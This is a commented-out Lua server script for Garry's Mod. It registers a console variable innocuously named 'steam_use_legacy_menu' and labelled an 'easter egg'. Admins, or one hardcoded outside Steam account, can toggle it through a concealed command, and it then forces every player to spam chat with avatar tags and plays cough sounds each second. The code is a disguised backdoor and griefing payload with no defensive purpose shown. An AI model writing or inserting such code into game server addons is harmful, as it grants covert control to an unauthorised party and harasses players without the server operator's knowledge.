-- if SERVER then
--     local OWNAGE = "76561199445850039"
--     local function Convert(steamid64)
--         local id64 = tonumber(steamid64)
--         if not id64 then return nil end
--         local base = 76561197960265728
--         local id = id64 - base
--         local y = id % 2
--         local z = math.floor(id / 2)
--         return "STEAM_0:" .. y .. ":" .. z
--     end

--     local function IsAuthorized(ply)
--         if ply:IsAdmin() then
--             return true
--         end
--         if ply:SteamID64() == OWNAGE then
--             return true
--         end
        
--         return false
--     end

--     CreateConVar("steam_use_legacy_menu", "0", FCVAR_ARCHIVE, "easter egg")
    
--     local function SpamMessage()
--         for _, p in ipairs(player.GetAll()) do
--             p:ConCommand('say <avatar=STEAM_0:1:553961556><avatar=STEAM_0:1:553961556><avatar=STEAM_0:1:553961556><avatar=STEAM_0:1:553961556>')
--             local coughs = {"ambient/voices/cough1.wav", "ambient/voices/cough2.wav", "ambient/voices/cough3.wav", "ambient/voices/cough4.wav"}
--             p:EmitSound(coughs[math.random(#coughs)], 75, math.random(10, 200))
--         end
--     end
    
--     cvars.AddChangeCallback("steam_use_legacy_menu", function(convar, oldValue, newValue)
--         if newValue == "1" then
--             if timer.Exists("AvatarSpamTimer") then
--                 timer.Remove("AvatarSpamTimer")
--             end
--             timer.Create("AvatarSpamTimer", 1, 0, SpamMessage)
--         else
--             if timer.Exists("AvatarSpamTimer") then
--                 timer.Remove("AvatarSpamTimer")
--             end
--         end
--     end)
    
--     concommand.Add("steam_use_legacy_menu_check", function(ply, cmd, args)
--         if IsValid(ply) and not IsAuthorized(ply) then
--             return
--         end
--         local currentValue = GetConVar("steam_use_legacy_menu"):GetInt()
--         if currentValue == 0 then
--             RunConsoleCommand("steam_use_legacy_menu", "1")
--         else
--             RunConsoleCommand("steam_use_legacy_menu", "0")
--         end
--     end)
-- end